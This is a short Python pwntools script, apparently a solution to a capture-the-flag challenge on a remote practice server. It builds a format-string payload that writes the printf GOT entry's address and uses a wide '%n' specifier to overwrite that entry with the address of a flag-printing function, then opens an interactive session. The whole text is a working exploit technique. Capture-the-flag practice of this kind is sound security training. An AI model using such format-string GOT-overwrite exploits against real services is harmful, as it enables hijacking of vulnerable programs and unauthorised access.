from pwn import *

r=remote("ctf.j0n9hyun.xyz", 3002)

printf_got = 0x804A00C
flag = 0x80485B4 #134514100

exploit_str = p32(printf_got)
exploit_str += b"%134514096x%n"

r.recvuntil("input : ")
r.sendline(exploit_str)
r.interactive()